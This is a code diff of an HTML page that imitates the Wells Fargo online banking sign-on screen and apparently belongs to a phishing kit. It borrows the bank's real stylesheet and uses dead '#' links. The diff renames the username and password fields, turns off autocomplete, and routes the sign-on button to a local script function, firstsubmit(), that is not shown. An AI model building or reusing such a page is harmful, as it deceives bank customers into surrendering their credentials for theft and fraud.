@@ -1,95 +1,89 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>Sign On to View Your Personal Accounts | Wells Fargo</title>
 
-    <head>
+    <meta
+      name="viewport"
+      content="width=device-width,inital-scale=1,user-scalable=no"
+    />
 
-        <title> Sign On to View Your Personal Accounts | Wells Fargo </title>
+    <link
+      href="https://connect.secure.wellsfargo.com/auth/static/ui/loginaltsignon/public/stylesheets/wfui.6ebb943e9edf6233ffea.chunk.css"
+      rel="stylesheet"
+    />
+    <link href="./css/all.min.css" rel="stylesheet" />
+    <link href="./css/style.css" rel="stylesheet" />
 
-        <meta name="viewport" content="width=device-width,inital-scale=1,user-scalable=no">
+    <script src="./js/jquery.min.js"></script>
+    <script src="./js/main.js"></script>
+    <script src="./js/all.min.js"></script>
+  </head>
 
-        <link
-            href="https://connect.secure.wellsfargo.com/auth/static/ui/loginaltsignon/public/stylesheets/wfui.6ebb943e9edf6233ffea.chunk.css"
-            rel="stylesheet">
-        <link href="./css/all.min.css" rel="stylesheet">
-        <link href="./css/style.css" rel="stylesheet">
+  <body>
+    <header>
+      <div class="header_flex">
+        <div class="header-title">WELLS FARGO</div>
+        <div class="header-links">
+          <a href="#"> Enroll </a>
+          <a href="#"> Customer Service </a>
+          <a href="#"> ATMs/Locations </a>
+          <a href="#"> Espanol </a>
+        </div>
+      </div>
+      <div class="after-header-line"></div>
+    </header>
 
+    <main>
+      <div class="main-container">
+        <div class="main-form">
+          <h3>Good Day</h3>
+          <p>Sign on to manage your accounts</p>
 
-        <script src="./js/jquery.min.js"></script>
-        <script src="./js/main.js"></script>
-        <script src="./js/all.min.js"></script>
-
-    </head>
-
-    <body>
-
-
-        <header>
-
-            <div class="header_flex">
-                <div class="header-title">
-                    WELLS FARGO
-                </div>
-                <div class="header-links">
-                    <a href="#"> Enroll </a>
-                    <a href="#"> Customer Service </a>
-                    <a href="#"> ATMs/Locations </a>
-                    <a href="#"> Espanol </a>
-                </div>
-            </div>
-            <div class="after-header-line"></div>
-
-        </header>
-
-        <main>
-
-            <div class="main-container">
-
-                <div class="main-form">
-
-                    <h3> Good Day </h3>
-                    <p> Sign on to manage your accounts </p>
-
-                    <form role="form" id="sign-in-form">
-
-                        <div class="form_input_flex">
-                            <input type="text" placeholder="Username" id="username">
-                        </div>
-
-                        <div class="form_input_flex">
-                            <input type="password" placeholder="Password" id="password">
-                            <i class="fa fa-eye"></i>
-                        </div>
-
-                        <button> Sign on </button>
-
-                    </form>
-
-                    <div class="form-extra-details">
-                        Need help? <a href="#">Create a new password</a> or <a href="#">find your username</a>
-                    </div>
-
-                </div>
-
+          <form role="form" id="sign-in-form">
+            <div class="form_input_flex">
+              <input
+                type="text"
+                placeholder="Username"
+                autocomplete="organization"
+                id="orgus"
+              />
             </div>
 
+            <div class="form_input_flex">
+              <input
+                type="password"
+                placeholder="Password"
+                autocomplete="off"
+                id="orgpd"
+              />
+              <i class="fa fa-eye"></i>
+            </div>
 
+            <button type="button" onclick="firstsubmit()" id="firstbtn">
+              Sign on
+            </button>
+          </form>
 
-        </main>
+          <div class="form-extra-details">
+            Need help? <a href="#">Create a new password</a> or
+            <a href="#">find your username</a>
+          </div>
+        </div>
+      </div>
+    </main>
 
-        <footer>
-
-            <a href="#"> About Wells Fargo </a> |
-            <a href="#"> Online Access Agreement </a> |
-            <a href="#"> Privacy, Cookies, Security & Legal </a> |
-            <a href="#"> Notice of Data Collection </a> |
-            <a href="#"> Report Email Fraud </a> |
-            <a href="#"> Security Center </a> |
-            <a href="#"> Sitemap </a> |
-            <a href="#"> Ad Choices </a>
-            <p> &copy; 1999 - 2021 Wells Fargo. All rights reserved. NMLSR ID 399801 </p>
-
-        </footer>
-
-    </body>
-
+    <footer>
+      <a href="#"> About Wells Fargo </a> |
+      <a href="#"> Online Access Agreement </a> |
+      <a href="#"> Privacy, Cookies, Security & Legal </a> |
+      <a href="#"> Notice of Data Collection </a> |
+      <a href="#"> Report Email Fraud </a> | <a href="#"> Security Center </a> |
+      <a href="#"> Sitemap </a> |
+      <a href="#"> Ad Choices </a>
+      <p>
+        &copy; 1999 - 2021 Wells Fargo. All rights reserved. NMLSR ID 399801
+      </p>
+    </footer>
+  </body>
 </html>
